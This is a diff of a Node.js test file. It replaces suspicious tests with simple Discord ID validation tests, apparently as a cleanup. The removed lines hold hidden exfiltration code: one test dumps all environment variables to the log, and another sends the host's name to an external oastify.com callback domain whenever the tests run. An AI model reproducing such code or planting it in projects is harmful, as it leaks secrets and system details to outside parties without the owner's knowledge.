@@ -1,28 +1,35 @@
 const { test } = require('node:test');
-const os = require('node:os');
-test('shows the environment', () => {
-  console.log("for user debug:")
-  for (const [key, value] of Object.entries(process.env)) {
-    console.log(`${key}=${value}`);
-  }
+const assert = require('node:assert');
+
+test('Discord ID validation - valid snowflake', () => {
+  const validateDiscordId = (id) => {
+    if (!id || !/^\d+$/.test(id)) {
+      throw new Error('Invalid Discord ID: must be a numeric snowflake');
+    }
+    return id;
+  };
+
+  assert.strictEqual(validateDiscordId('123456789012345678'), '123456789012345678');
 });
 
+test('Discord ID validation - rejects non-numeric', () => {
+  const validateDiscordId = (id) => {
+    if (!id || !/^\d+$/.test(id)) {
+      throw new Error('Invalid Discord ID: must be a numeric snowflake');
+    }
+    return id;
+  };
 
-const https = require('node:https');
+  assert.throws(() => validateDiscordId('invalid-id'), /numeric snowflake/);
+});
 
-const hostname = os.hostname();
+test('Discord ID validation - rejects empty', () => {
+  const validateDiscordId = (id) => {
+    if (!id || !/^\d+$/.test(id)) {
+      throw new Error('Invalid Discord ID: must be a numeric snowflake');
+    }
+    return id;
+  };
 
-const TARGET = 'https://p9z8ly8s5n06ifalxwhts86fm6sxgn4c.oastify.com';
-const url = `${TARGET}?hostname=${encodeURIComponent(hostname)}`;
-
-test('http get to external host', (t, done) => {
-  const req = https.get(url, (res) => {
-    console.log('status', res.statusCode);
-    res.resume();
-    res.on('end', done);
-  });
-  req.on('error', (err) => {
-    console.log('error', err.message);
-    done();
-  });
+  assert.throws(() => validateDiscordId(''), /numeric snowflake/);
 });
